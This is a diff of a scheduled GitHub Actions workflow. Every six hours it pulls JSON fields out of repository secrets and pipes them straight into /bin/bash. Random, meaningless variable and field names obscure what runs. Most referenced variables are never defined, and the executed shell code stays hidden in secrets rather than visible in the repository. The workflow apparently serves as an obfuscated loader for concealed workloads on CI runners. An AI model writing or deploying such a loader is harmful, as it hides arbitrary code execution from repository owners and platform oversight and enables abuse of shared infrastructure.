@@ -3,28 +3,21 @@ name: boringsinglet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
-jobs:  # 24220
+    - cron: '16 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: boringsinglet
         env:
-          kao24670: ${{ secrets.kao24670 }}
+          rs1: ${{ secrets.rs1 }}
         run: |
-          echo $kao24670 | jq -r .a6166 | /bin/bash
-          echo $ud7 | jq -r .og55479 | /bin/bash
-          echo $a30974 | jq -r .ep2 | /bin/bash
-          echo $do3907 | jq -r .hrt65089 | /bin/bash
-          echo $gqls9 | jq -r .zkqz88 | /bin/bash
-          echo $zkwy1 | jq -r .x47 | /bin/bash
-          echo $h0 | jq -r .nod278 | /bin/bash
-          echo $dhp65 | jq -r .sh1 | /bin/bash
-          echo $q43 | jq -r .xh94 | /bin/bash
-          echo $nkpo5 | jq -r .scr696 | /bin/bash
-          echo $ud40610 | jq -r .fitf2 | /bin/bash
-          echo $iby5 | jq -r .swvh9 | /bin/bash
-          echo $m046 | jq -r .s052 | /bin/bash
+          echo $rs1 | jq -r .v903 | /bin/bash
+          echo $eza80578 | jq -r .imf44 | /bin/bash
+          echo $wno03803 | jq -r .k3 | /bin/bash
+          echo $ojky84 | jq -r .jz4309 | /bin/bash
+          echo $bdzy33 | jq -r .ru40 | /bin/bash
+          echo $cztn5962 | jq -r .z563 | /bin/bash
 
